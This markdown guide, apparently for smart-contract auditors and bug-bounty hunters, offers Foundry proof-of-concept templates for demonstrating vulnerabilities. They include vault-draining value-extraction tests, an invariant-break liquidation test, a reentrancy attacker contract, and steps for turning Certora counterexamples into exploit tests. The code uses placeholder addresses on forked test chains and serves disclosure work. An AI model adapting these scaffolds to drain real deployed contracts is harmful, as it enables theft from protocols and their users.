# Practical PoC Template for Vulnerability Demonstration

**Quick Guide for You:**

If you're writing your own PoC:

1. Scroll to "Template 1" or "Template 2" sections
2. Copy the entire template code
3. Find these lines and replace them:

```solidity
import {VulnerableContract} from "src/VulnerableContract.sol"; // Change this
target.vulnerableFunction(); // Change this to your exploit
```
4. Run the test

**If asking AI (like me) to write it:**

1. Tell me: "I found a bug in Vault.sol where withdraw() doesn't check balances"
2. Tell me: "Use Template 1 from POC_TEMPLATE.md"
3. I'll generate the complete working code
4. You just review and run it

## How to Use This Template

**Start here:** Do you want to write the PoC yourself or have AI help you?

---

### Option 1: Write PoC Yourself (Recommended for Learning)

**Steps:**
1. Scroll down to **"Quick Decision"** section
2. Answer: "Does the attacker extract value?" → Choose Template 1 or 2
3. Copy the chosen template code
4. Replace the placeholder parts:
   - `VulnerableContract` → Your actual contract name
   - `testExploit()` → Your actual attack steps
   - `address constant MAINNET_VAULT = 0x...` → Real addresses
5. Run: `forge test --match-test testExploit -vvv`

**Example of what to replace:**
```solidity
// Template says:
target.vulnerableFunction();

// You write:
target.withdraw(type(uint256).max); // Your actual exploit
```

---

### Option 2: Have AI Write PoC for You

**When to use:** You have the vulnerability analysis ready but want AI to generate the code.

**Steps:**
1. First, write down your vulnerability details (see format below)
2. Copy that analysis + one of the templates below
3. Ask AI: "Generate a PoC using this template and vulnerability details"
4. Review and test the generated code

**Format your vulnerability analysis like this:**

```
I found a vulnerability in [Contract]:

CONTRACT: contracts/Vault.sol
FUNCTION: withdraw(uint256 amount)
ROOT CAUSE: Missing balance check allows withdrawal of more than deposited
IMPACT: Attacker can drain vault funds
ATTACK STEPS:
  1. Deposit 100 tokens
  2. Call withdraw(1000 tokens) - doesn't revert
  3. Attacker receives 1000 tokens, vault loses 900

TEMPLATE TO USE: Template 1 (Value Extraction)
```

**Then ask AI:**
```
Generate a practical Foundry PoC for this vulnerability using Template 1.

[Paste your vulnerability analysis above]

Requirements:
- Fork mainnet at block 19500000
- Attacker starts with 1000 tokens from whale
- Demonstrate the 900 token profit
```

**Important:** Always review AI-generated code for:
- Correct import paths
- Realistic values
- No `vm.store()` on target contract
- Proper assertions

---

## Using This Template with Certora Findings

When Certora finds a real bug and you want to write a PoC to demonstrate it:

### Step 1: Analyze the Counterexample

From the Certora output, extract:
- **Rule that failed:** Which invariant/rule was violated?
- **Call trace:** What sequence of functions led to the violation?
- **State that broke:** What values changed incorrectly?
- **Arguments used:** What inputs triggered the bug?

### Step 2: Translate to Vulnerability Description

```
CERTORA FINDING:
Rule: [invariant_name or rule_name]
Contract: [Contract.sol]
Function: [vulnerableFunction]
Violation: [What invariant was broken]

ROOT CAUSE:
[Extract from call trace - what code path executed incorrectly]

IMPACT:
[What does this violation mean in real terms - theft, DoS, insolvency?]
```

### Step 3: Choose PoC Template

- If Certora shows balance/supply violation → Use **Template 1 (Value Extraction)**
- If Certora shows access control bypass → Use **Template 2 (Invariant Break)**

### Step 4: Map Call Trace to PoC

Take the Certora call trace and convert to Foundry test. For example,

```solidity
// Certora found: deposit(1000) → withdraw(2000) → VIOLATION

function testFinding() public {
    vm.startPrank(attacker);
    
    // Replicate exact sequence from Certora
    target.deposit(1000e18);
    target.withdraw(2000e18); // Should fail but doesn't
    
    vm.stopPrank();
    
    // Verify the violation Certora found
    assertGt(token.balanceOf(attacker), 1000e18, "Attacker withdrew more than deposited");
}
```

### Example: Complete Workflow

```
1. Certora reports: "invariant_solvency VIOLATED"
   Call trace: user deposits 100 tokens → price manipulated → withdraws 200 tokens

2. You analyze: This is an oracle manipulation leading to value extraction

3. You choose: Template 1 (Value Extraction)

4. You write PoC:
   - setUp(): Fork mainnet, get oracle address
   - testExploit(): 
     a. Deposit 100 tokens
     b. Manipulate oracle price (if possible externally)
     c. Withdraw based on manipulated price
     d. Assert profit > 0

5. You run: forge test --match-test testExploit -vvv

6. Result: PoC confirms Certora finding is exploitable on-chain
```

---

## Quick Decision: What Type of Bug?

Before writing code, answer one question:

**Does the attacker extract value (tokens/ETH)?**
- **Yes** → Write a **Value Extraction PoC** (most common)
- **No** → Write an **Invariant Break PoC** (unauthorized execution)

That's it. Don't overthink it.

---

## Template 1: Value Extraction PoC (Most Common)

Use this when the attacker steals/drains/mints tokens or ETH.

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// Import target contract
import {VulnerableContract} from "src/VulnerableContract.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract ExploitTest is Test {
    // ═══════════════════════════════════════════════════════════
    // SETUP
    // ═══════════════════════════════════════════════════════════
    
    VulnerableContract public target;
    IERC20 public token;
    
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    // Mainnet addresses (if forking)
    address constant MAINNET_TOKEN = 0x...; // Replace with actual
    address constant MAINNET_VAULT = 0x...; // Replace with actual
    uint256 constant FORK_BLOCK = 19_500_000; // Recent block
    
    function setUp() public {
        // Option A: Mainnet fork (for deployed contracts)
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
        target = VulnerableContract(MAINNET_VAULT);
        token = IERC20(MAINNET_TOKEN);
        
        // Option B: Local deployment (for pre-deployment)
        // target = new VulnerableContract();
        // token = new MockERC20();
        
        // Fund attacker with gas
        vm.deal(attacker, 10 ether);
        
        // Fund attacker with initial tokens (if needed)
        // Method 1: From whale
        address whale = 0x...; // Find on Etherscan
        vm.prank(whale);
        token.transfer(attacker, 1000e18);
        
        // Method 2: Deal (only for testing tokens, not target contract)
        // deal(address(token), attacker, 1000e18);
        
        // Label for readable traces
        vm.label(address(target), "VulnerableVault");
        vm.label(address(token), "Token");
        vm.label(attacker, "Attacker");
    }
    
    // ═══════════════════════════════════════════════════════════
    // THE EXPLOIT
    // ═══════════════════════════════════════════════════════════
    
    function testExploit() public {
        // Record balances before
        uint256 attackerBefore = token.balanceOf(attacker);
        uint256 victimBefore = token.balanceOf(address(target));
        
        console.log("=== Before ===");
        console.log("Attacker balance:", attackerBefore / 1e18);
        console.log("Vault balance:", victimBefore / 1e18);
        
        // Execute exploit as attacker
        vm.startPrank(attacker);
        {
            // Step 1: [Describe what you're doing]
            token.approve(address(target), type(uint256).max);
            target.deposit(1000e18);
            
            // Step 2: [Trigger vulnerability]
            // Example: Reentrancy, rounding error, oracle manipulation, etc.
            target.vulnerableFunction();
            
            // Step 3: [Extract profit]
            target.withdraw(target.balanceOf(attacker));
        }
        vm.stopPrank();
        
        // Record balances after
        uint256 attackerAfter = token.balanceOf(attacker);
        uint256 victimAfter = token.balanceOf(address(target));
        
        console.log("\n=== After ===");
        console.log("Attacker balance:", attackerAfter / 1e18);
        console.log("Vault balance:", victimAfter / 1e18);
        
        // Calculate impact
        uint256 profit = attackerAfter - attackerBefore;
        uint256 loss = victimBefore - victimAfter;
        
        console.log("\n=== Impact ===");
        console.log("Attacker profit:", profit / 1e18);
        console.log("Vault loss:", loss / 1e18);
        
        // Verify exploit worked
        assertGt(profit, 0, "Attacker should profit");
        assertGt(loss, 0, "Vault should lose funds");
        
        // Optional: Verify it's economically significant
        // assertGt(profit, 10_000e18, "Profit should exceed $10k");
    }
}
```

### What to Customize

1. **Imports** - Add your actual contract imports
2. **setUp()** - Choose fork or local deployment
3. **Initial tokens** - Get tokens via whale or protocol functions
4. **testExploit()** - Replace with your actual attack steps
5. **Assertions** - Verify the specific impact you're demonstrating

---

## Template 2: Invariant Break PoC (No Value Transfer)

Use this when the attacker triggers unauthorized execution but doesn't extract value directly.

Examples:
- Liquidating a solvent position
- Bypassing access control
- Breaking a safety check
- Permanent DoS or griefing

### Minimal Working Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {VulnerableContract} from "src/VulnerableContract.sol";

contract InvariantBreakTest is Test {
    VulnerableContract public target;
    
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Deploy or fork
        target = new VulnerableContract();
        
        // Setup victim in a "safe" state that should be protected
        vm.prank(victim);
        target.createSafePosition();
        
        vm.deal(attacker, 1 ether);
    }
    
    function testInvariantBreak() public {
        // State the invariant being tested
        console.log("=== Testing Invariant ===");
        console.log("RULE: Only insolvent positions can be liquidated");
        console.log("Victim solvency:", target.getSolvencyRatio(victim));
        
        // Verify victim is in "safe" state
        assertTrue(target.isSolvent(victim), "Victim should be solvent");
        
        // Attacker attempts unauthorized action
        vm.startPrank(attacker);
        {
            // This should fail if invariant holds, but won't because of bug
            target.liquidate(victim);
        }
        vm.stopPrank();
        
        // Verify the invariant was broken
        console.log("\n=== After Attack ===");
        console.log("Liquidation executed:", target.wasLiquidated(victim));
        
        // Assert the unauthorized execution occurred
        assertTrue(
            target.wasLiquidated(victim),
            "Solvent position was liquidated (invariant broken)"
        );
        
        // Show the downstream impact
        uint256 victimLoss = target.calculateLiquidationPenalty(victim);
        console.log("Victim penalty:", victimLoss / 1e18);
        
        assertGt(victimLoss, 0, "Victim suffered loss from invalid liquidation");
    }
}
```

### When to Use This Template

Use **Invariant Break** template when:
- The bug allows calling a protected function
- Execution reaches unauthorized code paths
- A safety check is bypassed
- The impact is griefing/DoS/breaking protocol state

**Important:** You still need to show **real harm**:
- Show what function executed that shouldn't have
- Show the victim's loss or protocol damage
- Show why this matters economically

---

## Common Patterns & Helpers

### Pattern 1: Get Tokens from Whale

```solidity
function fundAttackerFromWhale(address token, uint256 amount) internal {
    // Find whale on Etherscan (holder with largest balance)
    address whale = 0x...; // Top holder address
    
    uint256 whaleBalance = IERC20(token).balanceOf(whale);
    require(whaleBalance >= amount, "Whale insufficient");
    
    vm.prank(whale);
    IERC20(token).transfer(attacker, amount);
}
```

### Pattern 2: Measure Gas Cost

```solidity
function testExploitWithGasTracking() public {
    uint256 gasBefore = gasleft();
    
    vm.prank(attacker);
    target.exploit();
    
    uint256 gasUsed = gasBefore - gasleft();
    console.log("Gas used:", gasUsed);
    console.log("Gas cost (at 50 gwei):", (gasUsed * 50 gwei) / 1e18, "ETH");
}
```

### Pattern 3: Time-Based Exploits

```solidity
function testExploitRequiresTimeDelay() public {
    // Setup vulnerable state
    vm.prank(attacker);
    target.setupAttack();
    
    // Wait for condition
    vm.warp(block.timestamp + 1 days);
    
    // Execute
    vm.prank(attacker);
    target.executeAttack();
    
    // Verify
    assertGt(token.balanceOf(attacker), 0);
}
```

### Pattern 4: Multi-Transaction Attack

```solidity
function testMultiTxExploit() public {
    // Transaction 1: Setup
    vm.prank(attacker);
    target.txStep1();
    
    // Simulate block advancement (if needed)
    vm.roll(block.number + 1);
    
    // Transaction 2: Exploit
    vm.prank(attacker);
    target.txStep2();
    
    // Transaction 3: Extract
    vm.prank(attacker);
    target.txStep3();
    
    // Verify final state
    assertGt(token.balanceOf(attacker), initialBalance);
}
```

### Pattern 5: Reentrancy Template

```solidity
contract AttackerContract {
    VulnerableContract public target;
    uint256 public attackDepth;
    
    constructor(address _target) {
        target = VulnerableContract(_target);
    }
    
    function attack() external {
        target.withdraw();
    }
    
    // Reentrancy callback
    receive() external payable {
        if (attackDepth < 3) {
            attackDepth++;
            target.withdraw();
        }
    }
}

// In your test
function testReentrancy() public {
    AttackerContract attackerContract = new AttackerContract(address(target));
    
    // Fund the attack contract
    vm.deal(address(attackerContract), 1 ether);
    
    // Execute
    attackerContract.attack();
    
    // Verify
    assertGt(address(attackerContract).balance, 1 ether);
}
```

---

## Rules for Realistic PoCs

### ✅ DO:

1. **Start from real state** - Fork mainnet or deploy fresh
2. **Use public functions** - Only call what any user can call
3. **Show the profit** - Actual token/ETH numbers
4. **Keep it minimal** - Shortest path to demonstrate the bug
5. **Console.log key steps** - Help reviewers understand the flow

### ❌ DON'T:

1. **Don't use `vm.store()` on target contract** - Can't change deployed contract storage
2. **Don't use `vm.mockCall()` on in-scope contracts** - Mocking target contract behavior makes the PoC unrealistic
3. **Don't give attacker special powers** - No admin roles, no direct storage writes
4. **Don't skip critical steps** - If exploit needs setup, show it
5. **Don't use unrealistic amounts** - Keep token amounts reasonable
6. **Don't over-comment** - Code should be self-explanatory

### Special Case: When `vm.store()` Is OK

Only use `vm.store()` to model **historical state** that could have existed:

```solidity
// ✅ ACCEPTABLE: Modeling past checkpoint that wasn't revalidated
function testStaleCheckpointExploit() public {
    // This checkpoint could have been set 30 days ago
    uint256 oldCheckpoint = block.timestamp - 30 days;
    
    // Store it to simulate the past state
    vm.store(
        address(target),
        bytes32(uint256(5)), // checkpoint slot
        bytes32(oldCheckpoint)
    );
    
    // Now show the bug: protocol doesn't revalidate this old data
    vm.prank(attacker);
    target.useCheckpoint(); // This shouldn't work but does
    
    // Show the harm
    assertGt(token.balanceOf(attacker), 0);
}
```

---

## Running Your PoC

### Basic Run

```bash
# Local deployment
forge test --match-test testExploit -vvv

# Mainnet fork
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvv
```

### With Gas Report

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --gas-report
```

### Debug Mode (Full Traces)

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL -vvvvv
```

### Specific Block

```bash
forge test --match-test testExploit --fork-url $MAINNET_RPC_URL --fork-block-number 19500000
```

---

## Checklist Before Submitting

Quick checks:

- [ ] PoC runs with `forge test` without errors
- [ ] Attacker starts with realistic resources (just gas + maybe some tokens)
- [ ] No `vm.store()` on target contract (unless justified)
- [ ] Console logs show before/after state clearly
- [ ] Assertions prove the exploit worked
- [ ] Gas cost is reasonable (<5M gas if possible)
- [ ] Works on mainnet fork with real addresses
- [ ] Code is minimal - no unnecessary complexity

---

## Example: Complete Real PoC

Here's what a real, working PoC looks like:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RoundingExploitTest is Test {
    Vault public vault;
    IERC20 public token;
    
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Fork mainnet
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        
        vault = Vault(0x123...); // Real vault address
        token = IERC20(vault.asset());
        
        // Get tokens from whale
        address whale = 0xabc...; // Top USDC holder
        vm.prank(whale);
        token.transfer(attacker, 1_000_000e6); // $1M USDC
        
        vm.label(address(vault), "Vault");
        vm.label(attacker, "Attacker");
    }
    
    function testRoundingExploit() public {
        uint256 vaultBalanceBefore = token.balanceOf(address(vault));
        
        console.log("Vault balance:", vaultBalanceBefore / 1e6, "USDC");
        
        vm.startPrank(attacker);
        
        // Exploit: Deposit and immediately withdraw with rounding in attacker's favor
        token.approve(address(vault), type(uint256).max);
        
        // Large deposit
        vault.deposit(1_000_000e6, attacker);
        
        // Trigger rounding bug by withdrawing 1 wei less
        vault.withdraw(vault.maxWithdraw(attacker) - 1, attacker, attacker);
        
        vm.stopPrank();
        
        uint256 vaultBalanceAfter = token.balanceOf(address(vault));
        uint256 profit = token.balanceOf(attacker) - 1_000_000e6;
        
        console.log("Vault balance:", vaultBalanceAfter / 1e6, "USDC");
        console.log("Attacker profit:", profit / 1e6, "USDC");
        
        // Vault lost funds due to rounding
        assertLt(vaultBalanceAfter, vaultBalanceBefore);
        
        // Attacker gained funds
        assertGt(profit, 0);
        
        console.log("\nExploit successful! Drained", (vaultBalanceBefore - vaultBalanceAfter) / 1e6, "USDC");
    }
}
```

This PoC is:
- **Clean** - No excessive comments or structure
- **Realistic** - Uses real mainnet contracts
- **Minimal** - Only the exploit steps
- **Clear** - Console logs show the impact
- **Proven** - Assertions verify it worked

---

## Summary

**For most bugs:** Use **Value Extraction Template**
**For access control / invariant bugs:** Use **Invariant Break Template**

**Keep it simple:**
1. Setup realistic state
2. Execute the exploit
3. Show the impact with console.logs
4. Verify with assertions

**The PoC should answer one question:**
"Can an attacker with no special privileges exploit this to cause real harm?"

If the answer is yes, you've written a good PoC.
